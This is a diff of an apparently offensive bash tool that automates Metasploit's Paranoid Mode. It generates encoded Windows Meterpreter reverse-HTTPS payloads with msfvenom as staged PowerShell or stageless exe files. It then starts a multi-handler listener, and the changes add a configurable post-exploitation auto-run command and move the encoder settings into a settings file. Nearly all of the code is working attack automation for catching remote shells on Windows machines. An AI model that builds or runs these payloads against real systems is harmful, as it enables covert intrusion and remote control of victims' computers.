@@ -20,6 +20,10 @@
 # https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode
 # https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation
 ##
+# Resize terminal windows size befor running the tool (gnome terminal)
+# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
+resize -s 39 80 > /dev/null
+##
 
 
 
@@ -29,18 +33,15 @@
 #                                           |
 V3R="1.3"                                   # Tool version release
 IPATH=`pwd`                                 # Store tool full install path
-ChEk_DB="OFF"                               # Rebuild msfdb database (postgresql)?
-DEFAULT_EXT="bat"                           # Default payload (staged) extension (bat | ps1 | txt)
-ENCODE="x86/shikata_ga_nai"                 # Msf encoder to use to encode payload (32bits | 64bits)
-ENCODE_NUMB="3"                             # How many interactions to encode payload (0 | 9)
 # __________________________________________|
-
-
-
-###
-# Resize terminal windows size befor running the tool (gnome terminal)
-# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 39 80 > /dev/null
+#
+# Read options (configurations) from settings file ..
+#
+ENCODE=`cat $IPATH/settings | egrep -m 1 "MSF_ENCODER" | cut -d '=' -f2` > /dev/null 2>&1 # Msf encoder to use to encode payload
+ChEk_DB=`cat $IPATH/settings | egrep -m 1 "REBUILD_MSFDB" | cut -d '=' -f2` > /dev/null 2>&1 # Rebuild msfdb database?
+DEFAULT_EXT=`cat $IPATH/settings | egrep -m 1 "PAYLOAD_EXTENSION" | cut -d '=' -f2` > /dev/null 2>&1 # Payload extension(bat|ps1|txt)
+ENCODE_NUMB=`cat $IPATH/settings | egrep -m 1 "ENCODER_INTERACTIONS" | cut -d '=' -f2` > /dev/null 2>&1 # Interactions to encode (0|9)
+PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_COMMAND" | cut -d '=' -f2` > /dev/null 2>&1 # Msf command to run at session popup
 
 
 
@@ -161,6 +162,7 @@ InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
 case $DiStR0 in
     Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
     Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
+    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
     Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
     Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
     BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
@@ -246,7 +248,7 @@ else
   #
   # Cancel button pressed, aborting script execution ..
   #
-  echo ${RedF}[x]${white}" Cancel button pressed, aborting .."
+  echo ${RedF}[x]${white}" Cancel button, aborting .."
   if [ "$ChEk_DB" = "ON" ]; then
   service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   fi
@@ -262,15 +264,15 @@ fi
 BuIlD=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.$DEFAULT_EXT)" FALSE "stageless (payload.exe)" --width 300 --height 160) > /dev/null 2>&1
 #
 # Staged payload build (batch output)
-# HINT: Edit script and change 'DEFAULT_EXT=bat' to the extension required ..
+# HINT: Edit settings file and change 'DEFAULT_EXTENSION=bat' to the extension required ..
 #
 if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   echo ${BlueF}[☠]${white} staged payload sellected ..${Reset};
   sleep 1
   #
-  # Check for NON-compatible extensions (staged payloads) ..
+  # Check for NON-compatible extension (staged payloads) ..
   #
-  if ! [ "$DEFAULT_EXT" = "bat" ] || [ "$DEFAULT_EXT" = "ps1" ] || [ "$DEFAULT_EXT" = "txt" ]; then
+  if [ "$DEFAULT_EXT" = "exe" ]; then
     # NOT compatible payload extension found ..
     echo ${RedF}[x] Aborting script execution ..${Reset};
     echo ${RedF}[x]${white} Extension:${RedF}$DEFAULT_EXT ${white}'(Not compatible)' with ${RedF}Staged${white} payloads ..${Reset};
@@ -286,7 +288,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
     echo ${BlueF}[☠]${white} Building staged payload ..${BlueF};
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
-    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_tcp" --width 350 --height 280) > /dev/null 2>&1
+    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 230) > /dev/null 2>&1
     msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -f psh-cmd -o paranoid-staged.$DEFAULT_EXT
 
       #
@@ -314,15 +316,13 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
         fi
 
 
-
   # 
   # Create the staged Paranoid Listener (multi-handler)
   #
   # A staged payload would need to set the HandlerSSLCert and
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
-  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; exploit'"
-  echo ${BlueF}[☠]${white} Module execution finished ..${Reset};
+  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
   sleep 2
 
 
@@ -340,9 +340,10 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
     echo ${BlueF}[☠]${white} Building stageless payload ..${BlueF};
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
-    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" FALSE "windows/meterpreter_reverse_http" --width 350 --height 220) > /dev/null 2>&1
+    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" --width 350 --height 200) > /dev/null 2>&1
     msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -f exe -o paranoid-stageless.exe
     sleep 2
+
 
   #
   # Create a stageless Paranoid Listener (multi-handler)..
@@ -350,8 +351,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   # A stageless payload would need to set the HandlerSSLCert and
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
-  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; exploit'"
-  echo ${BlueF}[☠]${white} Module execution finished ..${Reset};
+  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
   sleep 2
 
 
@@ -359,7 +359,7 @@ else
   #
   # Cancel button pressed, aborting script execution ..
   #
-  echo ${RedF}[x]${white}" Cancel button pressed, aborting .."
+  echo ${RedF}[x]${white}" Cancel button, aborting .."
   if [ "$ChEk_DB" = "ON" ]; then
   service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   fi
@@ -372,6 +372,7 @@ fi
 #
 # The End ..
 #
+echo ${BlueF}[☠]${white} Module execution finished ..${Reset};
 if [ "$ChEk_DB" = "ON" ]; then
 service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 fi
